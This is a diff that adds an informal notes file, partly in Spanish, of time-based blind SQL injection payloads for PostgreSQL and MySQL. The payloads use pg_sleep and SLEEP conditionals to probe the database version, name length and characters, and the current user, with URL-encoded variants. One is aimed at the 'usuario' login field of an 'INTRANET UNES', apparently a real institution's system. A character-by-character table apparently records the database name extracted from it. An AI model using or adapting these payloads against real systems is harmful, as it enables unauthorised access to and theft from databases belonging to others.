@@ -1,0 +1,50 @@
+(SELECT SUBSTR((SELECT version()),1,1))=CHAR(80)
+SELECT LENGTH(current_database()))> 10  << postgres
+
+SELECT substr(current_database(),1,1)= CHAR(80)
+
+SELECT CASE WHEN substr(current_database(),1,1)= 'a' THEN pg_sleep(10) ELSE NULL END;
+
+mysql
+SELECT IF(LENGTH(USER()) > 15, SLEEP(10), NULL) 
+mysql
+
+SELECT CASE WHEN condicion THEN resultado ELSE NULL END
+
+SELECT CASE WHEN (SELECT LENGTH(current_database())> 10) THEN pg_sleep(10) ELSE NULL END;
+
+URL ENCODE:
+
+SELECT%20CASE%20WHEN%20(SELECT%20LENGTH(current_database())%3E%2010)%20THEN%20pg_sleep(10)%20ELSE%20NULL%20END;
+
+;SELECT%20CASE%20WHEN%20(SELECT%20LENGTH(current_database())%3E%2010)%20THEN%20pg_sleep(10)%20ELSE%20NULL%20END;%20--%20
+
+INTRANET UNES:
+
+usuario=55555555';SELECT%20CASE%20WHEN%20(SELECT%20LENGTH(current_database())%3D%2011)%20THEN%20pg_sleep(10)%20ELSE%20NULL%20END;%20--%20
+
+bypass: SELECT CASE WHEN substr(current_database(),1,1)= 'a' THEN pg_sleep(10) ELSE NULL END;
+
+SELECT%20CASE%20WHEN%20substr(current_database()%2C1%2C1)%3D%20%27a%27%20THEN%20pg_sleep(10)%20ELSE%20NULL%20END;%20--%20
+
+1.- d 		--> d
+2.- b q y 2	--> b
+3.- a _		--> _
+4.- p x 8	--> x
+5.- s l		--> s
+6.-i		--> i
+7.-s _		--> s
+8.-t 8		--> t
+9.-e x 8	--> e
+10.-n 7		--> n
+11.-c		--> c
+
+select current_user;
+
+
+SELECT CASE WHEN (SELECT LENGTH(current_user) < 10) THEN pg_sleep(20) ELSE NULL END;
+
+
+
+
+
